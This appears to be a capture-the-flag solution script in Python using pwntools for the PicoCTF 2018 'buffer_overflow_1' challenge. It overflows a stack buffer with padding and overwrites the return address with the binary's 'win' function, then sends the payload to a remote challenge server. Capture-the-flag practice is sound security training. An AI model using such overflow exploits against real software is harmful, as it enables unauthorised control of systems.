from pwn import *

proc_name = './PicoCTF_2018_buffer_overflow_1'

#p = process(proc_name)
p = remote('node4.buuoj.cn', 25720)
elf = ELF(proc_name)

backdoor = elf.sym['win']

payload = b'a' * ( 0x28 + 4 ) + p32(backdoor)

p.recvuntil('string: ')

p.sendline(payload)

p.interactive()
